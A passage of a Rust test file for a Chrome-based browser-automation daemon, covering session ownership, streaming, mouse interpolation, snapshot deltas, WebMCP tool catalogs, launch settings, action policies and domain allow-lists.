            pending_browser_use_session().session.session_id
        );
        assert!(state.active_provider_connection && state.browser.is_none());
    }
}

#[tokio::test]
#[ignore = "requires Chrome"]
async fn e2e_browser_use_owned_connection_preserves_plain_command_state() {
    let mut producer = BrowserManager::launch(LaunchOptions::default(), None)
        .await
        .unwrap();
    let mut state = DaemonState::new();
    state.browser = Some(
        BrowserManager::connect_cdp(producer.get_cdp_url())
            .await
            .unwrap(),
    );
    state.active_provider_session = Some(pending_browser_use_session());
    state.active_provider_connection = true;
    let target = state
        .browser
        .as_ref()
        .unwrap()
        .active_target_id()
        .unwrap()
        .to_string();
    for script in [
        "window.__providerSentinel = 'kept'",
        "window.__providerSentinel",
    ] {
        let response = execute_command(
            &json!({"id":"continuity", "action":"evaluate", "script":script}),
            &mut state,
        )
        .await;
        assert_eq!(response["success"], true);
        assert_eq!(response["data"]["result"], "kept");
        assert_eq!(
            state.browser.as_ref().unwrap().active_target_id().unwrap(),
            target
        );
    }
    assert!(state.active_provider_session.is_some());
    state.active_provider_session = None;
    close_current_browser(&mut state).await.unwrap();
    assert!(producer.is_connection_alive().await);
    producer.close().await.unwrap();
}

#[test]
fn test_provider_owned_cdp_connection_remains_idle_cleanup_eligible() {
    assert!(
        !default_idle_shutdown_is_blocked(false, true, true),
        "provider ownership must override the attached-CDP exemption"
    );
    assert!(default_idle_shutdown_is_blocked(false, false, true));
    assert!(default_idle_shutdown_is_blocked(true, true, false));
}

#[test]
fn test_provider_ownership_does_not_require_cleanup_metadata() {
    let mut state = DaemonState::new();

    remember_active_provider_session(&mut state, None, &[]);

    assert!(state.active_provider_connection);
    assert!(state.active_provider_session.is_none());
}

#[tokio::test]
async fn test_close_current_browser_clears_iframe_sessions() {
    let mut state = DaemonState::new();
    state
        .iframe_sessions
        .insert("frame-1".to_string(), "session-1".to_string());
    state.active_iframe_sessions.insert("session-1".to_string());

    close_current_browser(&mut state).await.unwrap();

    assert!(state.iframe_sessions.is_empty());
    assert!(state.active_iframe_sessions.is_empty());
}

#[tokio::test]
async fn test_stream_enable_disable_and_status_without_browser() {
    let guard = EnvGuard::new(&["FROB_SOCKET_DIR", "FROB_SESSION"]);
    let socket_dir = unique_socket_dir("stream-runtime");
    fs::create_dir_all(&socket_dir).expect("socket dir should be created");
    guard.set(
        "FROB_SOCKET_DIR",
        socket_dir.to_str().expect("socket dir should be utf-8"),
    );
    guard.set("FROB_SESSION", "stream-runtime-session");

    let mut state = DaemonState::new();

    let disabled_status = handle_stream_status(&state)
        .await
        .expect("status should work before enable");
    assert_eq!(disabled_status["enabled"], false);
    assert_eq!(disabled_status["port"], Value::Null);
    assert_eq!(disabled_status["connected"], false);
    assert_eq!(disabled_status["screencasting"], false);

    let enabled_status = handle_stream_enable(&json!({ "port": 0 }), &mut state)
        .await
        .expect("stream enable should succeed");
    let port = enabled_status["port"]
        .as_u64()
        .expect("runtime stream should report a bound port");
    assert!(port > 0, "runtime stream should bind a non-zero port");
    assert_eq!(enabled_status["enabled"], true);
    assert_eq!(enabled_status["connected"], false);
    assert_eq!(enabled_status["screencasting"], false);

    let stream_path = socket_dir.join("stream-runtime-session.stream");
    let port_file = fs::read_to_string(&stream_path).expect("stream metadata file should exist");
    assert_eq!(port_file.trim(), port.to_string());

    let duplicate_err = handle_stream_enable(&json!({}), &mut state)
        .await
        .expect_err("duplicate enable should fail");
    assert!(duplicate_err.contains("already enabled"));

    let status = handle_stream_status(&state)
        .await
        .expect("status should work after enable");
    assert_eq!(status["enabled"], true);
    assert_eq!(status["port"], port);

    let disabled = handle_stream_disable(&mut state)
        .await
        .expect("stream disable should succeed");
    assert_eq!(disabled["disabled"], true);
    assert!(
        !stream_path.exists(),
        "disabling runtime stream should remove the metadata file"
    );
    assert!(state.stream_server.is_none());
    assert!(state.stream_client.is_none());

    let final_status = handle_stream_status(&state)
        .await
        .expect("status should work after disable");
    assert_eq!(final_status["enabled"], false);
    assert_eq!(final_status["port"], Value::Null);

    let disable_err = handle_stream_disable(&mut state)
        .await
        .expect_err("duplicate disable should fail");
    assert!(disable_err.contains("not enabled"));

    let _ = fs::remove_dir_all(&socket_dir);
}

#[tokio::test]
async fn test_stream_disable_preserves_existing_screencast_state() {
    let guard = EnvGuard::new(&["FROB_SOCKET_DIR", "FROB_SESSION"]);
    let socket_dir = unique_socket_dir("stream-preserve-screencast");
    fs::create_dir_all(&socket_dir).expect("socket dir should be created");
    guard.set(
        "FROB_SOCKET_DIR",
        socket_dir.to_str().expect("socket dir should be utf-8"),
    );
    guard.set("FROB_SESSION", "stream-preserve-screencast-session");

    let mut state = DaemonState::new();
    handle_stream_enable(&json!({ "port": 0 }), &mut state)
        .await
        .expect("stream enable should succeed");
    state.screencasting = true;

    let disabled = handle_stream_disable(&mut state)
        .await
        .expect("stream disable should succeed");
    assert_eq!(disabled["disabled"], true);
    assert!(
        state.screencasting,
        "stream disable should not clear an independently managed screencast state"
    );

    let _ = fs::remove_dir_all(&socket_dir);
}

#[tokio::test]
async fn test_stream_disable_clears_state_when_stream_file_removal_fails() {
    let guard = EnvGuard::new(&["FROB_SOCKET_DIR", "FROB_SESSION"]);
    let socket_dir = unique_socket_dir("stream-disable-cleanup");
    fs::create_dir_all(&socket_dir).expect("socket dir should be created");
    guard.set(
        "FROB_SOCKET_DIR",
        socket_dir.to_str().expect("socket dir should be utf-8"),
    );
    guard.set("FROB_SESSION", "stream-disable-cleanup-session");

    let mut state = DaemonState::new();
    handle_stream_enable(&json!({ "port": 0 }), &mut state)
        .await
        .expect("stream enable should succeed");

    let stream_path = socket_dir.join("stream-disable-cleanup-session.stream");
    fs::remove_file(&stream_path).expect("stream metadata file should exist");
    fs::create_dir(&stream_path).expect("directory should force remove_stream_file failure");

    let err = handle_stream_disable(&mut state)
        .await
        .expect_err("stream disable should surface file removal failure");
    assert!(err.contains("Failed to remove stream metadata"));
    assert!(
        state.stream_server.is_none(),
        "stream disable should clear stream_server even when metadata cleanup fails"
    );
    assert!(
        state.stream_client.is_none(),
        "stream disable should clear stream_client even when metadata cleanup fails"
    );

    let _ = fs::remove_dir_all(&socket_dir);
}

#[tokio::test]
async fn test_stream_enable_port_conflict_returns_error() {
    let guard = EnvGuard::new(&["FROB_SOCKET_DIR", "FROB_SESSION"]);
    let socket_dir = unique_socket_dir("stream-port-conflict");
    fs::create_dir_all(&socket_dir).expect("socket dir should be created");
    guard.set(
        "FROB_SOCKET_DIR",
        socket_dir.to_str().expect("socket dir should be utf-8"),
    );
    guard.set("FROB_SESSION", "stream-port-conflict-session");

    let listener =
        std::net::TcpListener::bind("127.0.0.1:0").expect("test should reserve an ephemeral port");
    let port = listener
        .local_addr()
        .expect("listener should have local addr")
        .port();

    let mut state = DaemonState::new();
    let err = handle_stream_enable(&json!({ "port": port }), &mut state)
        .await
        .expect_err("conflicting port should fail");
    assert!(err.contains("Failed to bind stream server"));
    assert!(state.stream_server.is_none());
    assert!(state.stream_client.is_none());
    assert!(
        !socket_dir
            .join("stream-port-conflict-session.stream")
            .exists(),
        "failed enable should not leave stale metadata behind"
    );

    drop(listener);
    let _ = fs::remove_dir_all(&socket_dir);
}

#[test]
fn interpolated_mouse_path_uses_easing_and_exact_endpoint() {
    let midpoint = interpolated_mouse_point(0.0, 0.0, 100.0, 0.0, 0.0, 1.0, 10.0, 1, 2);
    assert_eq!(midpoint, (50.0, 10.0));
    let endpoint = interpolated_mouse_point(0.0, 0.0, 100.0, 0.0, 0.0, 1.0, 10.0, 2, 2);
    assert_eq!(endpoint, (100.0, 0.0));
}

#[test]
fn human_mouse_path_samples_short_moves_at_animation_cadence() {
    assert_eq!(interpolated_mouse_steps(10.0, 100, None, true), 7);
    assert_eq!(interpolated_mouse_steps(10.0, 100, None, false), 1);
    assert_eq!(interpolated_mouse_steps(10.0, 100, Some(3), true), 3);
}

#[tokio::test]
async fn mouse_move_duration_includes_cdp_response_latency() {
    use futures_util::{SinkExt, StreamExt};
    use std::time::Duration;
    use tokio_tungstenite::tungstenite::Message;

    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let url = format!("ws://{}", listener.local_addr().unwrap());
    let server = tokio::spawn(async move {
        let (stream, _) = listener.accept().await.unwrap();
        let mut ws = tokio_tungstenite::accept_async(stream).await.unwrap();
        let mut positions = Vec::new();
        for _ in 0..4 {
            let message = ws.next().await.unwrap().unwrap().into_text().unwrap();
            let command: Value = serde_json::from_str(&message).unwrap();
            assert_eq!(command["method"], "Input.dispatchMouseEvent");
            assert_eq!(command["params"]["buttons"], 1);
            positions.push((
                command["params"]["x"].as_f64().unwrap(),
                command["params"]["y"].as_f64().unwrap(),
            ));
            tokio::time::sleep(Duration::from_millis(200)).await;
            ws.send(Message::Text(
                json!({ "id": command["id"], "result": {} }).to_string(),
            ))
            .await
            .unwrap();
        }
        positions
    });
    let client = CdpClient::connect(&url).await.unwrap();
    let mut mouse = MouseState::default();
    let history = Arc::new(std::sync::Mutex::new(
        recording::RecordingCursorHistory::default(),
    ));
    let started = tokio::time::Instant::now();
    move_mouse_interpolated(
        &client,
        "page",
        &mut mouse,
        400.0,
        200.0,
        1000,
        Some(4),
        true,
        42,
        1,
        (0.0, 0.0),
        &history,
    )
    .await
    .unwrap();
    let elapsed = started.elapsed();
    assert!(elapsed >= Duration::from_millis(1000));
    assert!(
        elapsed < Duration::from_millis(1600),
        "response latency was added to the movement duration: {elapsed:?}"
    );
    let positions = server.await.unwrap();
    assert_eq!(positions.last(), Some(&(400.0, 200.0)));
    assert_eq!((mouse.x, mouse.y), (400.0, 200.0));
}

#[test]
fn snapshot_delta_tree_splice_preserves_changes_missing_from_ref_metadata() {
    let padding = "- button \"Unchanged\" [ref=e99]\n".repeat(40);
    let before = format!("{padding}- button \"Save\" [ref=e1]\n- checkbox \"Agree\" [ref=e2]");
    let after =
        format!("{padding}- button \"Saved\" [ref=e1]\n- checkbox \"Agree\" [ref=e2] [checked]");
    let previous = SnapshotRevision {
            revision: 1, url: "about:blank".into(), options: "{}".into(), tree: before.clone(),
            refs: serde_json::from_value(json!({"e1": {"role": "button", "name": "Save"}, "e2": {"role": "checkbox", "name": "Agree"}})).unwrap(),
        };
    let mut refs = previous.refs.clone();
    refs["e1"]["name"] = json!("Saved");
    for current in [after, before.replace("[ref=e2]", "[ref=e2] [checked]")] {
        let result = snapshot_delta_response(&previous, 2, &current, &refs, &previous.url);
        assert_eq!(result["snapshot"]["kind"], "delta");
        let patch = &result["snapshot"]["treeChange"];
        let start = patch["startLine"].as_u64().unwrap() as usize;
        let count = patch["deleteCount"].as_u64().unwrap() as usize;
        let mut reconstructed: Vec<&str> = before.split('\n').collect();
        reconstructed.splice(
            start..start + count,
            patch["lines"]
                .as_array()
                .unwrap()
                .iter()
                .map(|v| v.as_str().unwrap()),
        );
        assert_eq!(reconstructed.join("\n"), current);
    }
}

#[test]
fn test_snapshot_delta_unchanged_is_tiny() {
    let previous = SnapshotRevision {
        revision: 4,
        url: "https://example.com".to_string(),
        options: "{}".to_string(),
        tree: "- button \"Save\" [ref=e1]".to_string(),
        refs: serde_json::from_value(json!({"e1": {"role": "button", "name": "Save"}})).unwrap(),
    };
    let result =
        snapshot_delta_response(&previous, 5, &previous.tree, &previous.refs, &previous.url);
    assert_eq!(result["snapshot"]["kind"], "unchanged");
    assert_eq!(result["snapshot"]["baseRevision"], 4);
    assert!(result["snapshot"].get("tree").is_none());
}

#[test]
fn test_snapshot_delta_reports_replacements_and_removals() {
    let previous = SnapshotRevision {
        revision: 1,
        url: "https://example.com".to_string(),
        options: "{}".to_string(),
        tree: format!("{}\nold", "x".repeat(1000)),
        refs: serde_json::from_value(json!({
            "e1": {"role": "button", "name": "Save"},
            "e2": {"role": "alert", "name": "Old"}
        }))
        .unwrap(),
    };
    let refs = serde_json::from_value(json!({
        "e1": {"role": "button", "name": "Saved"},
        "e3": {"role": "status", "name": "Done"}
    }))
    .unwrap();
    let result = snapshot_delta_response(
        &previous,
        2,
        &format!("{}\nnew", "x".repeat(1000)),
        &refs,
        &previous.url,
    );
    assert_eq!(result["snapshot"]["kind"], "delta");
    let changes = result["snapshot"]["changes"].as_array().unwrap();
    assert!(changes
        .iter()
        .any(|change| change["op"] == "replace" && change["ref"] == "@e1"));
    assert!(changes
        .iter()
        .any(|change| change["op"] == "remove" && change["ref"] == "@e2"));
    assert!(changes
        .iter()
        .any(|change| change["op"] == "add" && change["ref"] == "@e3"));
}

#[test]
fn test_success_response_structure() {
    let resp = success_response("cmd-1", json!({"url": "https://example.com"}));
    assert_eq!(resp["id"], "cmd-1");
    assert_eq!(resp["success"], true);
    assert!(resp["data"].is_object());
    assert_eq!(resp["data"]["url"], "https://example.com");
}

fn webmcp_tool(name: &str, origin: &str) -> webmcp::ToolRecord {
    webmcp::ToolRecord {
        name: name.to_string(),
        description: String::new(),
        input_schema: json!({}),
        annotations: json!({}),
        origin: origin.to_string(),
        frame_id: "frame-1".to_string(),
        backend_node_id: None,
    }
}

#[test]
fn test_browser_responses_include_current_webmcp_tools() {
    let tools = vec![webmcp_tool("search", "https://example.com")];
    for action in [
        "launch",
        "navigate",
        "click",
        "fill",
        "snapshot",
        "evaluate",
        "wait",
        "back",
        "reload",
        "tab_new",
        "tab_switch",
        "webmcp_invoke",
        "webmcp_result",
    ] {
        let mut resp = success_response("cmd", json!({"text": "unchanged"}));
        attach_webmcp_availability_from_tools(
            &mut resp,
            action,
            &tools,
            None,
            &mut webmcp::RuntimeState::default(),
            "session",
        );
        assert_eq!(resp["data"]["webmcp"]["toolCount"], 1, "{action}");
        assert_eq!(
            resp["data"]["webmcp"]["tools"][0]["name"], "search",
            "{action}"
        );
        assert!(resp["data"]["webmcp"]["tools"][0]
            .get("inputSchema")
            .is_none());
        assert_eq!(resp["data"]["text"], "unchanged");
    }
}

#[test]
fn test_empty_catalog_replaces_stale_tools_even_after_action_error() {
    let mut resp = error_response("cmd", "click failed");
    let mut runtime = webmcp::RuntimeState::default();
    runtime.context_update("session", &[webmcp_tool("search", "https://example.com")]);
    attach_webmcp_availability_from_tools(&mut resp, "click", &[], None, &mut runtime, "session");
    let mut subsequent = error_response("cmd", "click failed");
    let original = subsequent.clone();
    attach_webmcp_availability_from_tools(
        &mut subsequent,
        "click",
        &[],
        None,
        &mut runtime,
        "session",
    );
    assert_eq!(subsequent, original);
    assert_eq!(resp["success"], false);
    assert_eq!(resp["error"], "click failed");
    assert_eq!(resp["data"]["webmcp"]["status"], "ready");
    assert_eq!(resp["data"]["webmcp"]["available"], false);
    assert_eq!(resp["data"]["webmcp"]["tools"], json!([]));
}

#[test]
fn test_administrative_responses_do_not_discover_page_tools() {
    for action in [
        "close",
        "auth_list",
        "state_show",
        "read",
        "session_info",
        "webmcp_list",
        "deny",
    ] {
        let mut resp = success_response("cmd", json!({}));
        let expected = resp.clone();
        attach_webmcp_availability_from_tools(
            &mut resp,
            action,
            &[],
            None,
            &mut webmcp::RuntimeState::default(),
            "session",
        );
        assert_eq!(resp, expected, "{action}");
    }
}

#[test]
fn test_proactive_catalog_excludes_disallowed_origins() {
    let mut resp = success_response("cmd", json!({}));
    let tools = vec![
        webmcp_tool("search", "https://allowed.example"),
        webmcp_tool("secret", "https://blocked.example"),
    ];
    attach_webmcp_availability_from_tools(
        &mut resp,
        "snapshot",
        &tools,
        Some(&DomainFilter::new("allowed.example")),
        &mut webmcp::RuntimeState::default(),
        "session",
    );
    assert_eq!(resp["data"]["webmcp"]["toolCount"], 1);
    assert!(!resp.to_string().contains("secret"));
    assert!(!resp.to_string().contains("blocked.example"));
}

#[tokio::test]
async fn test_navigation_does_not_advertise_when_webmcp_is_disabled() {
    let mut state = DaemonState::new();
    state.engine = "chrome".to_string();
    state.webmcp_enabled = false;
    let mut resp = success_response("cmd-webmcp", json!({"url": "https://example.com"}));
    let expected = resp.clone();

    attach_webmcp_availability(&mut resp, "navigate", &mut state).await;

    assert_eq!(resp, expected);
}

#[test]
fn test_error_response_structure() {
    let resp = error_response("cmd-2", "Something went wrong");
    assert_eq!(resp["id"], "cmd-2");
    assert_eq!(resp["success"], false);
    assert_eq!(resp["error"], "Something went wrong");
    // Ordinary errors carry no machine-readable code.
    assert!(resp.get("code").is_none());
}

#[test]
fn test_error_response_tab_gone_code() {
    // Errors whose message starts with the tab-gone prefix get a
    // top-level machine-readable `code` so `--json` consumers can match
    // on it instead of parsing the message.
    let err = format!(
        "{} bound tab is gone (target ABC). Run `frob tab new <url>`",
        super::super::browser::TAB_GONE_PREFIX
    );
    let resp = error_response("cmd-3", &err);
    assert_eq!(resp["success"], false);
    assert_eq!(resp["code"], "tab_gone");
}

#[test]
fn test_webmcp_unsupported_error_is_actionable_and_machine_readable() {
    let error = webmcp::unsupported_error("active backend is lightpanda");
    let resp = error_response("cmd-webmcp", &error);
    assert_eq!(resp["success"], false);
    assert_eq!(resp["code"], webmcp::ERR_UNSUPPORTED);
    assert!(error.contains("current frob-managed Chrome"));
    assert!(error.contains("without --no-webmcp"));
    assert!(error.contains("active backend is lightpanda"));
}

#[tokio::test]
async fn test_daemon_state_new() {
    let guard = EnvGuard::new(&["FROB_ALLOWED_DOMAINS", "FROB_SESSION_NAME", "FROB_SESSION"]);
    guard.remove("FROB_ALLOWED_DOMAINS");
    guard.remove("FROB_SESSION_NAME");
    guard.remove("FROB_SESSION");

    let state = DaemonState::new();
    assert!(state.browser.is_none());
    assert!(state.domain_filter.read().await.is_none());
    assert_eq!(state.session_id, "default");
    assert!(!state.tracing_state.active);
    assert!(!state.recording_state.active);
    assert_eq!(state.mouse_state.x, 0.0);
    assert_eq!(state.mouse_state.y, 0.0);
    assert_eq!(state.mouse_state.buttons, 0);
}

#[test]
fn test_session_setup_treats_cleared_values_as_empty() {
    let mut setup = SessionSetup {
        extra_headers: Some(HashMap::new()),
        offline: Some(false),
        ..SessionSetup::default()
    };
    assert!(setup.is_empty());

    setup.offline = Some(true);
    assert!(!setup.is_empty());

    setup.offline = None;
    setup
        .extra_headers
        .as_mut()
        .unwrap()
        .insert("X-Test".to_string(), "set".to_string());
    assert!(!setup.is_empty());
}

#[test]
fn test_init_script_handles_are_independent_from_session_identifiers() {
    let mut setup = SessionSetup::default();
    let first = setup.register_init_script(
        "window.first = true".to_string(),
        "session-a".to_string(),
        "1".to_string(),
    );
    let second = setup.register_init_script(
        "window.second = true".to_string(),
        "session-b".to_string(),
        "1".to_string(),
    );

    assert_eq!(first, "init-script-1");
    assert_eq!(second, "init-script-2");
    assert_eq!(setup.init_scripts.len(), 2);
    assert_eq!(setup.init_scripts[0].session_identifiers["session-a"], "1");
    assert_eq!(setup.init_scripts[1].session_identifiers["session-b"], "1");
}

#[test]
fn test_mouse_event_params_preserve_position_and_buttons() {
    let mut mouse_state = MouseState::default();

    let move_params = build_mouse_event_params(
        &mut mouse_state,
        "mouseMoved",
        Some(120.0),
        Some(240.0),
        None,
        None,
        None,
        None,
        None,
        None,
    );
    assert_eq!(move_params.x, 120.0);
    assert_eq!(move_params.y, 240.0);
    assert_eq!(move_params.buttons, Some(0));

    let down_params = build_mouse_event_params(
        &mut mouse_state,
        "mousePressed",
        None,
        None,
        Some("left"),
        None,
        Some(1),
        None,
        None,
        None,
    );
    assert_eq!(down_params.x, 120.0);
    assert_eq!(down_params.y, 240.0);
    assert_eq!(down_params.button.as_deref(), Some("left"));
    assert_eq!(down_params.buttons, Some(1));
    assert_eq!(mouse_state.buttons, 1);

    let drag_move_params = build_mouse_event_params(
        &mut mouse_state,
        "mouseMoved",
        Some(150.0),
        Some(260.0),
        None,
        None,
        None,
        None,
        None,
        None,
    );
    assert_eq!(drag_move_params.buttons, Some(1));
    assert_eq!(drag_move_params.button.as_deref(), Some("left"));
    assert_eq!(mouse_state.x, 150.0);
    assert_eq!(mouse_state.y, 260.0);

    let up_params = build_mouse_event_params(
        &mut mouse_state,
        "mouseReleased",
        None,
        None,
        Some("left"),
        None,
        Some(1),
        None,
        None,
        None,
    );
    assert_eq!(up_params.x, 150.0);
    assert_eq!(up_params.y, 260.0);
    assert_eq!(up_params.buttons, Some(0));
    assert_eq!(mouse_state.buttons, 0);
}

#[test]
fn test_reset_input_state_clears_mouse_state() {
    let mut state = DaemonState::new();
    state.mouse_state.x = 12.0;
    state.mouse_state.y = 34.0;
    state.mouse_state.buttons = 1;

    state.reset_input_state();

    assert_eq!(state.mouse_state.x, 0.0);
    assert_eq!(state.mouse_state.y, 0.0);
    assert_eq!(state.mouse_state.buttons, 0);
}

#[test]
fn test_launch_options_from_env_defaults() {
    let guard = EnvGuard::new(&[
        "FROB_HEADED",
        "FROB_HIDE_SCROLLBARS",
        "FROB_ALLOWED_DOMAINS",
    ]);
    guard.remove("FROB_HEADED");
    guard.remove("FROB_HIDE_SCROLLBARS");
    guard.remove("FROB_ALLOWED_DOMAINS");
    let opts = Running::from_env().launch_options();
    assert!(opts.headless);
    assert!(opts.args.is_empty());
    assert!(!opts.allow_file_access);
    assert!(opts.hide_scrollbars);
    assert!(!opts.restrict_webrtc);
}

#[test]
fn test_launch_options_from_env_headed_flag() {
    let guard = EnvGuard::new(&["FROB_HEADED", "FROB_HIDE_SCROLLBARS"]);
    guard.set("FROB_HEADED", "1");
    guard.remove("FROB_HIDE_SCROLLBARS");
    let opts = Running::from_env().launch_options();
    assert!(!opts.headless, "FROB_HEADED=1 should set headless=false");
}

#[test]
fn test_launch_options_from_env_args_keep_commas_inside_values() {
    let guard = EnvGuard::new(&["FROB_ARGS"]);
    guard.set(
        "FROB_ARGS",
        "--disable-features=HttpsUpgrades,Translate,--no-first-run\n--window-size=1280,720",
    );
    let opts = Running::from_env().launch_options();
    assert_eq!(
        opts.args,
        vec![
            "--disable-features=HttpsUpgrades,Translate",
            "--no-first-run",
            "--window-size=1280,720",
        ]
    );
}

#[test]
fn test_launch_options_from_env_hide_scrollbars_false() {
    let guard = EnvGuard::new(&["FROB_HIDE_SCROLLBARS"]);
    guard.set("FROB_HIDE_SCROLLBARS", "false");
    let opts = Running::from_env().launch_options();
    assert!(!opts.hide_scrollbars);
}

#[test]
fn test_launch_options_from_env_webgpu() {
    let guard = EnvGuard::new(&["FROB_WEBGPU"]);
    guard.remove("FROB_WEBGPU");
    assert!(!Running::from_env().launch_options().webgpu);
    guard.set("FROB_WEBGPU", "1");
    assert!(Running::from_env().launch_options().webgpu);
}

#[test]
fn test_daemon_state_new_seeds_fields_from_settings() {
    let guard = EnvGuard::new(&[
        "FROB_ALLOWED_DOMAINS",
        "FROB_SESSION_NAME",
        "FROB_RESTORE_SAVE",
        "FROB_DEFAULT_TIMEOUT",
        "FROB_ENGINE",
        "FROB_NO_AUTO_DIALOG",
        "FROB_CONFIRM_ACTIONS",
        "FROB_ACTION_POLICY",
        "FROB_POLICY",
        "FROB_PIN_TAB",
    ]);
    guard.remove("FROB_POLICY");
    guard.remove("FROB_PIN_TAB");
    let policy_dir = tempfile::tempdir().unwrap();
    let policy_path = policy_dir.path().join("policy.json");
    fs::write(
        &policy_path,
        r#"{"default": "allow", "deny": ["evaluate"]}"#,
    )
    .unwrap();
    guard.set("FROB_ACTION_POLICY", policy_path.to_str().unwrap());
    guard.set("FROB_ALLOWED_DOMAINS", "a.test, *.b.test");
    guard.set("FROB_SESSION_NAME", "work");
    guard.set("FROB_RESTORE_SAVE", "never");
    guard.set("FROB_DEFAULT_TIMEOUT", "7000");
    guard.set("FROB_ENGINE", "lightpanda");
    guard.set("FROB_NO_AUTO_DIALOG", "1");
    guard.set("FROB_CONFIRM_ACTIONS", "click,fill");

    let state = DaemonState::new();
    assert_eq!(state.session_name.as_deref(), Some("work"));
    assert_eq!(state.restore_save, "never");
    assert_eq!(state.default_timeout_ms, 7000);
    assert_eq!(state.engine, "lightpanda");
    assert!(!state.auto_dialog);
    let policy = state.policy.as_ref().expect("action policy");
    assert!(matches!(policy.check("evaluate"), PolicyResult::Deny(_)));
    assert_eq!(policy.check("click"), PolicyResult::Allow);
    let confirm = state.confirm_actions.as_ref().expect("confirm actions");
    assert!(confirm.requires_confirmation("click"));
    assert!(!confirm.requires_confirmation("navigate"));
    let filter = state.domain_filter.try_read().unwrap();
    let filter = filter.as_ref().expect("domain filter");
    assert!(filter.is_allowed("a.test"));
    assert!(filter.is_allowed("x.b.test"));
    assert!(!filter.is_allowed("c.test"));
}

#[test]
fn test_separator_only_allowed_domains_allow_every_host() {
    let guard = EnvGuard::new(&["FROB_ALLOWED_DOMAINS"]);
    guard.set("FROB_ALLOWED_DOMAINS", " , ");
    let state = DaemonState::new();
    // No filter at all, so direct-page providers are not refused either.
    assert!(state.domain_filter.try_read().unwrap().is_none());
}

#[test]
fn test_effective_ca_cert_transitions_distinguish_omission_and_clear() {
    let mut state = DaemonState::new();
    state.effective_ca_cert = Some(EffectiveCaCert {
        path: "/tmp/first.pem".to_string(),
        bundle: crate::ca_bundle::test_bundle(b"first"),
    });

    let omitted = resolve_effective_ca_cert(&json!({}), &state)
        .unwrap()
        .expect("omission should retain the effective CA");
    assert_eq!(omitted.path, "/tmp/first.pem");

    let cleared = resolve_effective_ca_cert(&json!({ "clearCaCert": true }), &state).unwrap();
    assert!(cleared.is_none());
}

#[test]
fn test_provider_compatibility_uses_resolved_ca_cert_transition() {
    let mut state = DaemonState::new();
    state.effective_ca_cert = Some(EffectiveCaCert {
        path: "/tmp/first.pem".to_string(),
        bundle: crate::ca_bundle::test_bundle(b"first"),
    });

    let retained = resolve_effective_ca_cert(&json!({}), &state).unwrap();
    let mut retained_options = LaunchOptions::default();
    apply_effective_ca_cert(&mut retained_options, &retained);
    let error = validate_ca_cert_launch_mode(&retained_options, Some("chrome"), true).unwrap_err();
    assert!(error.contains("CA trust is active for this session"));
    assert!(error.contains("--no-ca-cert"));

    let cleared = resolve_effective_ca_cert(&json!({ "clearCaCert": true }), &state).unwrap();
    let mut cleared_options = LaunchOptions::default();
    apply_effective_ca_cert(&mut cleared_options, &cleared);
    assert!(validate_ca_cert_launch_mode(&cleared_options, Some("chrome"), true).is_ok());
}

#[test]
fn test_relaunch_keeps_cdp_headers_only_for_their_endpoint() {
    let mut state = DaemonState::new();
    state.cdp_headers = Some((
        "wss://example.com/cdp".to_string(),
        vec![("Authorization".to_string(), "Bearer a".to_string())],
    ));

    let mut same = json!({ "action": "launch", "cdpUrl": "wss://example.com/cdp" });
    attach_saved_cdp_headers(&mut same, &state);
    assert_eq!(same["cdpHeaders"]["Authorization"], "Bearer a");

    let mut other = json!({ "action": "launch", "cdpUrl": "wss://other.example/cdp" });
    attach_saved_cdp_headers(&mut other, &state);
    assert!(other.get("cdpHeaders").is_none());
}

#[test]
fn test_effective_ca_cert_rejects_set_and_clear_together() {
    let state = DaemonState::new();
    let error = resolve_effective_ca_cert(
        &json!({
            "caCert": "/tmp/proxy-ca.pem",
            "clearCaCert": true
        }),
        &state,
    )
    .unwrap_err();

    assert!(error.contains("Cannot use --ca-cert with --no-ca-cert"));
}

#[test]
fn test_daemon_rejects_ca_cert_outside_local_chrome() {
    let ca = LaunchOptions {
        ca_cert: Some("/tmp/proxy-ca.pem".to_string()),
        ..Default::default()
    };
    assert!(validate_ca_cert_launch_mode(&ca, Some("chrome"), true).is_err());
    assert!(validate_ca_cert_launch_mode(&ca, Some("lightpanda"), false).is_err());

    let ignored = LaunchOptions {
        ca_cert: Some("/tmp/proxy-ca.pem".to_string()),
        ignore_https_errors: true,
        ..Default::default()
    };
    assert!(validate_ca_cert_launch_mode(&ignored, Some("chrome"), false).is_err());

    let profile = LaunchOptions {
        ca_cert: Some("/tmp/proxy-ca.pem".to_string()),
        profile: Some("/tmp/profile".to_string()),
        ..Default::default()
    };
    assert!(validate_ca_cert_launch_mode(&profile, Some("chrome"), false).is_err());
}

#[test]
fn test_allowed_domains_from_launch_command_accepts_cli_array_and_legacy_string() {
    assert_eq!(
        allowed_domains_from_launch_command(&json!({
            "allowedDomains": ["Example.COM", " *.example.org "]
        })),
        Some(vec!["example.com".to_string(), "*.example.org".to_string()])
    );
    assert_eq!(
        allowed_domains_from_launch_command(&json!({
            "allowedDomains": "Example.COM, *.example.org"
        })),
        Some(vec!["example.com".to_string(), "*.example.org".to_string()])
    );
}

#[test]
fn test_network_controls_required_only_when_filter_or_proxy_auth_active() {
    let filter = DomainFilter::new("example.com");
    assert!(!network_controls_required(None, false));
    assert!(network_controls_required(Some(&filter), false));
    assert!(network_controls_required(None, true));
}

#[test]
fn test_defer_new_tab_url_until_proxy_auth_controls_are_active() {
    assert!(
        should_defer_url_until_network_controls(None, true, Some("https://example.com")).unwrap()
    );
    assert!(!should_defer_url_until_network_controls(None, true, None).unwrap());
    assert!(
        !should_defer_url_until_network_controls(None, false, Some("https://example.com")).unwrap()
    );
}

#[test]
fn test_defer_new_tab_url_checks_domain_filter() {
    let filter = DomainFilter::new("example.com");
    assert!(should_defer_url_until_network_controls(
        Some(&filter),
        false,
        Some("https://example.com")
    )
    .unwrap());
    let error =
        should_defer_url_until_network_controls(Some(&filter), false, Some("https://blocked.com"))
            .unwrap_err();
    assert!(error.contains("blocked.com"), "got: {}", error);
}

#[test]
fn test_network_control_session_ids_include_all_attached_pages() {
    let pages = vec![
        super::super::browser::PageInfo {
            tab_id: 1,
            label: None,
            target_id: "target-1".to_string(),
            session_id: "session-1".to_string(),
            url: "about:blank".to_string(),
            title: String::new(),
            target_type: "page".to_string(),
        },
        super::super::browser::PageInfo {
            tab_id: 2,
            label: None,
            target_id: "target-2".to_string(),
            session_id: "session-2".to_string(),
            url: "about:blank".to_string(),
            title: String::new(),
            target_type: "page".to_string(),
        },
        super::super::browser::PageInfo {
            tab_id: 3,
            label: None,
            target_id: "target-3".to_string(),
            session_id: "session-1".to_string(),
            url: "about:blank".to_string(),
            title: String::new(),
            target_type: "page".to_string(),
        },
